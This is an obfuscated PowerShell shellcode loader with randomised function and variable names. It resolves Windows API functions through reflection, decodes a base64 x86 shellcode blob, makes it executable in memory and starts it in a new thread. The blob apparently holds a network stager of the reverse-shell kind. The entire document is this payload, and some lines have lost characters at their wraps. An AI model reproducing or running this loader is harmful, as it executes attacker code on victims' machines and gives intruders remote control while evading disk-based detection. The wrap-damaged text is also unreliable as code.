function h77h {
        Param ($p_VL, $ak6M)
        $i42ip = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equal
('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $i42ip.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.
untime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($i42ip.GetMethod('GetModuleHand
e')).Invoke($null, @($p_VL)))), $ak6M))
}

function gYf {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $w2C,
                [Parameter(Position = 1)] [Type] $fdur9 = [Void]
        )

        $bSo = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.R
flection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Seale
, AnsiClass, AutoClass', [System.MulticastDelegate])
        $bSo.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $w2C).SetImplementatio
Flags('Runtime, Managed')
        $bSo.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $fdur9, $w2C).SetImplementationFlags('Runtime, Managed')

        return $bSo.CreateType()
}

[Byte[]]$pI = [System.Convert]::FromBase64String("/OiPAAAAYInlMdJki1Iwi1IMi1IUD7dKJotyKDH/McCsPGF8Aiwgwc8NAcdJde9Si1IQi0I8VwHQi0B4hcB0TAHQUtIGItYIAHThcl0PEkx/4s0iwHWMcCswc8NAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kEAACnEVFBoKYBrAP/VagpowqOnVmgCAAwpieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/VagBqBFZXaALZyF//1Ys2akBoABAAAFZqAGhYpFPl/9WTUoAVlNXaALZyF//1QHDKcZ17sM=")
[Uint32]$ohD = 0
$asW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h77h kernel32.dll VirtualAlloc), (gYf @([IntPtr], [UInt32],
[UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $pI.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($pI, 0, $asW, $pI.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h77h kernel32.dll VirtualProtect), (gYf @([IntPtr], [UIntPtr]
 [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($asW, [Uint32]$pI.Length, 0x10, [Ref]$ohD)) -eq $true) {
        $r4 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h77h kernel32.dll CreateThread), (gYf @([IntPtr], [U
nt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$asW,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h77h kernel32.dll WaitForSingleObject), (gYf @([IntPtr], [
nt32]))).Invoke($r4,0xffffffff) | Out-Null
}
